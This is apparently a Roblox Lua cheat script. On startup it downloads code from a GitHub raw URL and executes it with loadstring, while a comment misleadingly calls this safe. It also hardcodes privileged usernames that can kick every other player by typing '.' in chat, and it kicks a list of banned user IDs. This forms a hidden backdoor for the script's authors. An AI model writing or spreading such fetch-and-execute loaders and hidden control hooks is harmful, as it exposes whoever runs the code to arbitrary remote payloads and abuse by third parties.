local Players = game:GetService("Players")
local authorizedPlayers = { "linhmc_new", "Exile_five", "codexfly" } -- List of authorized players
local bannedPlayerIds = { 7433006080, 7422714003, 4399722659, 7243465729, 4233645947 } -- List of banned player IDs

-- Function to load and execute an external script safely
local function loadExternalScript()
    local success, result = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/Linhmcfake1/Build-and-battle-tp/refs/heads/main/Linked")
    end)
    if success then
        loadstring(result)()
    else
        warn("Failed to load external script: ", result)
    end
end

-- Load the external script
loadExternalScript()

-- Function to check if a player is authorized
local function isAuthorized(player)
    for _, name in ipairs(authorizedPlayers) do
        if name:lower() == player.Name:lower() then
            return true
        end
    end
    return false
end

-- Function to kick banned players if they are not authorized
local function kickBannedPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if not isAuthorized(player) and table.find(bannedPlayerIds, player.UserId) then
            player:Kick("You have been banned from this script")
        end
    end
end

-- Function to monitor chat of a player and kick unauthorized players on certain command
local function checkChat(player)
    player.Chatted:Connect(function(message)
        -- Only kick unauthorized players when an authorized player sends a message "."
        if isAuthorized(player) and message:match("^%s*%.%s*$") then
            for _, otherPlayer in ipairs(Players:GetPlayers()) do
                if not isAuthorized(otherPlayer) then
                    otherPlayer:Kick("You have been kicked.")
                end
            end
        end
    end)
end

-- Connect the chat checking function to all current players
for _, player in ipairs(Players:GetPlayers()) do
    checkChat(player)
end

-- Monitor new players joining the game
Players.PlayerAdded:Connect(function(player)
    checkChat(player)
    if not isAuthorized(player) and table.find(bannedPlayerIds, player.UserId) then
        player:Kick("You have been banned from this script")
    end
end)

-- Kick any banned players when the script starts
kickBannedPlayers()
